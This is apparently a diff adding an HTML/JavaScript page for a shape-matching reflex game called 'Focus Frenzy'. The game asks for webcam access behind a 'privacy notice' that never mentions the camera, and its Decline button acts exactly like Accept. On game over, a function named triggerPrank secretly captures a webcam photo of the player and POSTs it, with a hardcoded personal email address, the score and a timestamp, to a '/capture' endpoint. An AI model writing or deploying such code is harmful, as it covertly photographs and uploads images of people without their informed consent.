@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+    <title>Focus Frenzy</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* ⚠️ FIX APPLIED HERE */
+        html, body {
+            height: 100%; /* Ensures <html> and <body> take full viewport height */
+            width: 100%;  /* Ensures <html> and <body> take full viewport width */
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Press Start 2P', cursive;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 15px;
+            overflow-x: hidden;
+            touch-action: manipulation;
+        }
+        
+        #landing, #game, #gameover, #privacy-notice { 
+            display: none; 
+            text-align: center; 
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        #landing { 
+            display: block; 
+        }
+        
+        h1 { 
+            font-size: min(2.5rem, 8vw); 
+            margin-bottom: 1.5rem; 
+            text-shadow: 0 0 10px #0f0;
+            line-height: 1.3;
+        }
+        
+        p { 
+            font-size: min(1rem, 4vw); 
+            margin-bottom: 2rem; 
+            opacity: 0.8; 
+            line-height: 1.5;
+        }
+        
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: min(1rem, 4vw) min(1.5rem, 5vw);
+            font-family: inherit;
+            font-size: min(1rem, 4vw);
+            cursor: pointer;
+            box-shadow: 0 0 15px #0f0;
+            margin: 0.5rem;
+            border-radius: 8px;
+            transition: all 0.2s;
+            min-height: 50px;
+        }
+        
+        button:hover { 
+            background: #0c0; 
+            transform: scale(1.05); 
+        }
+        
+        #game-area {
+            width: min(400px, 85vw); 
+            height: min(400px, 85vw);
+            margin: 1.5rem auto;
+            position: relative;
+            background: #111;
+            border: min(4px, 1vw) solid #0f0;
+            overflow: hidden;
+            border-radius: 12px;
+        }
+        
+        .shape {
+            position: absolute;
+            top: 50%; 
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: min(6rem, 20vw);
+            opacity: 0;
+            transition: opacity 0.1s;
+            text-shadow: 0 0 20px #0f0;
+        }
+        
+        .lives { 
+            display: flex; 
+            justify-content: center; 
+            gap: min(1rem, 3vw); 
+            margin-bottom: 1rem;
+        }
+        
+        .score { 
+            font-size: min(1.5rem, 5vw); 
+            margin-bottom: 1rem; 
+        }
+        
+        #flash { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: white; 
+            opacity: 0; 
+            pointer-events: none; 
+            z-index: 9999; 
+            transition: opacity 0.3s;
+        }
+        
+        #webcam { 
+            position: absolute; 
+            bottom: min(10px, 2vw); 
+            right: min(10px, 2vw); 
+            width: min(80px, 20vw);
+            height: min(60px, 15vw);
+            border: min(2px, 0.5vw) solid #0f0;
+            border-radius: 6px;
+            background: #000;
+        }
+        
+        canvas { 
+            display: none; 
+        }
+        
+        /* DESKTOP UI (Large screens) */
+        @media (min-width: 769px) {
+            #mobile-controls { display: none !important; }
+            #keyboard-hint { display: block; }
+            .lives .heart { font-size: 2rem; }
+        }
+        
+        /* MOBILE UI (Small screens) */
+        @media (max-width: 768px) {
+            #mobile-controls { 
+                display: flex !important;
+                margin-top: 1.5rem;
+                gap: 1.5rem;
+                justify-content: center;
+                width: 100%;
+                max-width: 400px;
+            }
+            .mobile-btn {
+                font-size: 3.5rem;
+                padding: 1.5rem;
+                min-width: 90px;
+                min-height: 90px;
+                background: #222;
+                border: 4px solid #0f0;
+                color: #0f0;
+                border-radius: 16px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: bold;
+            }
+            .mobile-btn:active {
+                background: #0f0;
+                color: #000;
+                transform: scale(0.95);
+            }
+            #keyboard-hint { display: none !important; }
+        }
+        
+        /* Privacy Notice – PERFECTLY CENTERED */
+        #privacy-notice {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .warning-btn {
+            background: #f00;
+            box-shadow: 0 0 15px #f00;
+        }
+
+        #keyboard-hint {
+            font-size: 0.8rem; 
+            opacity: 0.6; 
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="privacy-notice">
+        <div style="background: #111; padding: 2rem; border: 3px solid #0f0; max-width: 500px; width: 90%; text-align: center; border-radius: 12px; box-shadow: 0 0 30px rgba(0,255,0,0.5);">
+            <h2 style="margin-bottom: 1rem;">⚠️  NOTICE ⚠️</h2>
+            <p style="margin: 1.5rem 0; line-height: 1.6;">
+                This game requires absolute FOCUS and REFLEXES
+            </p>
+            <div style="margin-top: 2rem;">
+                <button id="accept-privacy">✅ I ACCEPT</button>
+                <button id="decline-privacy" class="warning-btn">❌ DECLINE</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="landing">
+        <h1>FOCUS FRENZY</h1>
+        <p>Test your focus and reflexes!</p>
+        <button id="startBtn">🎮 PLAY GAME</button>
+    </div>
+
+    <div id="game">
+        <div class="lives" id="lives"></div>
+        <div class="score">Score: <span id="score">0</span></div>
+        
+        <div id="game-area">
+            <div id="shape" class="shape">○</div>
+            <video id="webcam" autoplay playsinline muted></video>
+        </div>
+        
+        <div id="mobile-controls">
+            <button class="mobile-btn" data-shape="circle">○</button>
+            <button class="mobile-btn" data-shape="square">□</button>
+            <button class="mobile-btn" data-shape="triangle">△</button>
+        </div>
+        
+        <p id="keyboard-hint">
+            Press: C = ○, S = □, T = △
+        </p>
+    </div>
+
+    <div id="gameover">
+        <h1>GAME OVER</h1>
+        <p>Final Score: <span id="finalScore">0</span></p>
+        <button id="retryBtn">🔄 PLAY AGAIN</button>
+    </div>
+
+    <div id="flash"></div>
+    
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // Configuration
+        const SERVER_URL = "/capture";
+        const SHAPES = { 
+            'circle': '○', 
+            'square': '□', 
+            'triangle': '△' 
+        };
+        const KEYS = { 
+            'c': 'circle', 
+            's': 'square', 
+            't': 'triangle' 
+        };
+
+        // Game State
+        let lives = 3;
+        let score = 0;
+        let correctStreak = 0;
+        let currentShape = null;
+        let timeoutId = null;
+        let stream = null;
+        let gameActive = false;
+        let responded = false;
+
+        // DOM Elements
+        const landing = document.getElementById('landing');
+        const game = document.getElementById('game');
+        const gameover = document.getElementById('gameover');
+        const privacyNotice = document.getElementById('privacy-notice');
+        const startBtn = document.getElementById('startBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const acceptPrivacyBtn = document.getElementById('accept-privacy');
+        const declinePrivacyBtn = document.getElementById('decline-privacy');
+        const livesEl = document.getElementById('lives');
+        const scoreEl = document.getElementById('score');
+        const finalScoreEl = document.getElementById('finalScore');
+        const shapeEl = document.getElementById('shape');
+        const flash = document.getElementById('flash');
+        const video = document.getElementById('webcam');
+        const mobileControls = document.getElementById('mobile-controls');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Initialize
+        privacyNotice.style.display = 'flex';
+        landing.style.display = 'none';
+
+        // Event Listeners
+        acceptPrivacyBtn.addEventListener('click', () => {
+            privacyNotice.style.display = 'none';
+            landing.style.display = 'block';
+        });
+
+        declinePrivacyBtn.addEventListener('click', () => {
+            privacyNotice.style.display = 'none';
+            landing.style.display = 'block';
+        });
+
+        startBtn.addEventListener('click', startGame);
+        retryBtn.addEventListener('click', () => location.reload());
+
+        // Mobile controls
+        mobileControls.addEventListener('click', (e) => {
+            if (!gameActive || !currentShape || responded) return;
+            const shape = e.target.getAttribute('data-shape');
+            if (shape) {
+                responded = true;
+                if (shape === currentShape) {
+                    handleCorrectInput();
+                } else {
+                    handleWrongInput();
+                }
+            }
+        });
+
+        // Keyboard input (works on both, but hint only shows on desktop)
+        document.addEventListener('keydown', (e) => {
+            if (!gameActive || !currentShape || responded) return;
+            const key = e.key.toLowerCase();
+            if (key === 'c' || key === 's' || key === 't') {
+                responded = true;
+                if (KEYS[key] === currentShape) {
+                    handleCorrectInput();
+                } else {
+                    handleWrongInput();
+                }
+            }
+        });
+
+        // Start game
+        async function startGame() {
+            landing.style.display = 'none';
+            game.style.display = 'block';
+            gameActive = true;
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                startGameLoop();
+            } catch (err) {
+                alert("Camera access is required!");
+                landing.style.display = 'block';
+                game.style.display = 'none';
+                gameActive = false;
+            }
+        }
+
+        function startGameLoop() {
+            lives = 3;
+            score = 0;
+            correctStreak = 0;
+            updateUI();
+            nextShape();
+        }
+
+        function nextShape() {
+            if (lives <= 0 || !gameActive) return;
+
+            responded = false;
+            const shapes = Object.keys(SHAPES);
+            currentShape = shapes[Math.floor(Math.random() * shapes.length)];
+            shapeEl.textContent = SHAPES[currentShape];
+            shapeEl.style.opacity = '1';
+
+            let baseDelay = 5000;
+            const speedLevel = Math.floor(correctStreak / 3);
+            const multiplier = Math.pow(0.75, speedLevel);
+            const delay = Math.max(400, baseDelay * multiplier);
+            
+            timeoutId = setTimeout(() => {
+                if (!responded && gameActive) loseLife();
+            }, delay);
+
+            setTimeout(() => {
+                if (!responded && gameActive) shapeEl.style.opacity = '0';
+            }, delay - 200);
+        }
+
+        function updateUI() {
+            scoreEl.textContent = score;
+            livesEl.innerHTML = '';
+            for (let i = 0; i < 3; i++) {
+                if (i < lives) {
+                    livesEl.innerHTML += '❤️';
+                } else {
+                    livesEl.innerHTML += '♡';
+                }
+            }
+        }
+
+        function handleCorrectInput() {
+            score++;
+            correctStreak++;
+            updateUI();
+            shapeEl.style.opacity = '0';
+            clearTimeout(timeoutId);
+            setTimeout(nextShape, 400);
+        }
+
+        function handleWrongInput() {
+            correctStreak = 0;
+            shapeEl.style.opacity = '0';
+            clearTimeout(timeoutId);
+            loseLife();
+        }
+
+        function loseLife() {
+            lives--;
+            correctStreak = 0;
+            updateUI();
+            if (lives > 0) {
+                setTimeout(nextShape, 600);
+            } else {
+                gameActive = false;
+                triggerPrank();
+            }
+        }
+
+        function triggerPrank() {
+            flash.style.opacity = '1';
+            setTimeout(() => {
+                flash.style.opacity = '0';
+                captureAndSend().then(() => {
+                    setTimeout(showGameOver, 500);
+                });
+            }, 300);
+        }
+
+        async function captureAndSend() {
+            if (!stream) return;
+            try {
+                if (video.videoWidth === 0) {
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('image', blob, 'capture.jpg');
+                        formData.append('email', 'joshua.cuebillas04@gmail.com');
+                        formData.append('score', score);
+                        formData.append('timestamp', new Date().toISOString());
+                        try {
+                            await fetch(SERVER_URL, { method: 'POST', body: formData });
+                        } catch (e) {
+                            console.error("Upload failed:", e);
+                        }
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                });
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
+
+        function showGameOver() {
+            game.style.display = 'none';
+            gameover.style.display = 'block';
+            finalScoreEl.textContent = score;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        console.log('Game initialized - Mobile/Desktop separated UI');
+    </script>
+</body>
+</html>
